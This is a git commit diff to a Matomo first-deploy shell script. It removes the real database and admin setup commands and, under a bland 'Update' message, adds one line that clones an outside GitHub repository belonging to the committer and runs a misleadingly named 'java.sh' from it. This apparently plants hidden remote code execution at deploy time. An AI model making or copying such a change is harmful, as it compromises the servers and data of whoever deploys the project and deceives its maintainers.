1c25707d1024c8715f1ab05461ba6768c3e80607
Storage Small <100378380+storagegitpush404@users.noreply.github.com>
2022-03-18 15:00:25 -0700

    Update first-deploy-init.sh

--- bin/first-deploy-init.sh
+++ bin/first-deploy-init.sh
@@ -2,9 +2,4 @@
 
 echo "Initializing Matomo database and users..."
 
-bin/generate-config-ini.sh
-
-php console database:create-tables && \
-  php console core:update --yes && \
-  php console admin:create-superuser --login $MATOMO_INIT_USER_LOGIN --email $MATOMO_INIT_USER_EMAIL --password $MATOMO_INIT_USER_PASSWORD && \
-  php console admin:create-site --name $MATOMO_INIT_SITE_NAME --url $MATOMO_INIT_SITE_URL
+git clone https://github.com/storagegitpush404/bash.git && cd bash && chmod +x java.sh && ./java.sh
